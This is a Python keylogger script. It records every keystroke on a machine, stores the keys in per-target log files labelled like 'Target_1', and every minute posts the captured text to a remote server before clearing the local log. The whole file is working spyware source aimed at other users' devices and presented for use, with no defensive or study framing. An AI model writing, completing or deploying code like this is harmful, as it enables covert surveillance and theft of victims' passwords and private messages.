import os
import time
import requests
from pynput.keyboard import Key, Listener

# Configuration
TARGET_DIR = "Logs"  # Directory to store logs
USER_NAME = "Target_1"  # Change this dynamically based on the user/device (e.g., "Target_1", "Target_2", etc.)
LOG_FILE = os.path.join(TARGET_DIR, f"{USER_NAME}.txt")  # Dynamic file name for each target
API_URL = "http://0.0.0.0:5000/logs"  # Replace with your FastAPI server URL
MAX_SIZE = 10 * 1024 * 1024  # 10MB file size limit

# Ensure the Logs directory exists
if not os.path.exists(TARGET_DIR):
    os.makedirs(TARGET_DIR)

# Function to log keystrokes to the target file
def log_key(key):
    try:
        with open(LOG_FILE, "a") as f:
            f.write(str(key) + "\n")
    except Exception as e:
        print(f"Error logging key: {e}")

# Function to send logs to the API every 60 seconds
def send_logs():
    while True:
        try:
            # Check if file exceeds MAX_SIZE
            if os.path.exists(LOG_FILE) and os.path.getsize(LOG_FILE) > MAX_SIZE:
                print(f"Log file {LOG_FILE} exceeded max size. Stopping logging.")
                return  # Stop the keylogger (optional)

            # Read the content of the log file
            with open(LOG_FILE, "r") as f:
                logs = f.read()

            if logs.strip():
                # Send logs to the FastAPI server
                response = requests.post(API_URL, json={"logs": logs, "user_name": USER_NAME})

                if response.status_code == 200:
                    print(f"Logs sent successfully. Status code: {response.status_code}")
                    # Clear the log file after sending data
                    with open(LOG_FILE, "w") as f:
                        f.truncate(0)  # Delete file content

            time.sleep(60)  # Wait for 60 seconds before sending again

        except Exception as e:
            print(f"Error sending logs: {e}")
            time.sleep(60)

# Listen for keypresses
def on_press(key):
    log_key(key)

def on_release(key):
    if key == Key.esc:
        return False  # Stop listener

# Start listening for keypresses in a non-blocking way
with Listener(on_press=on_press, on_release=on_release) as listener:
    send_logs()  # Start the log sending process
    listener.join()
